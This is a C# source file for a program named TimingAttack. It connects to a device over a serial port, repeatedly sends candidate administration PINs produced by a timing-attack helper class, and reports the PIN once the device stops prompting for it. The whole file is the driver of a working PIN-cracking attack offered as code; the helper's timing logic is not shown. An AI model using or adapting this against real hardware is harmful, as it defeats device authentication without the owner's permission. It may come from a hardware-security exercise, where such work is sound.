using System.IO.Ports;

namespace TimingAttack
{
    internal class Program
    {
        private static SerialPort port;
        private static TimingManager timingAttacker = new TimingManager();

        static void Main(string[] args)
        {
            Console.Write("Enter port number: ");
            var portNumber = Convert.ToInt32(Console.ReadLine());
            
            port = new SerialPort($"COM{portNumber}",
                9600, Parity.None, 8, StopBits.One);
            
            port.DataReceived += new SerialDataReceivedEventHandler(port_DataReceived);

            port.Open();

            while (port.IsOpen)
            {
                var message = timingAttacker.GetNext();
                Console.WriteLine($"Trying PIN {message}");
                timingAttacker.StartTiming();
                port.WriteLine(message);
                Thread.Sleep(TimeSpan.FromSeconds(1));
            }
            
            Console.WriteLine("Enter any key to exit..");
            Console.ReadLine();
            Environment.Exit(0);
        }
        
        private static void port_DataReceived(object sender, SerialDataReceivedEventArgs e)
        {
            var receivedMessage = port.ReadExisting();
            if (!receivedMessage.StartsWith("Enter administration PIN"))
            {
                Console.WriteLine($"Found PIN: {timingAttacker.GetCurrentPIN()}");
                port.Close();
                return;
            }
            timingAttacker.Received(receivedMessage);
        }
    }
}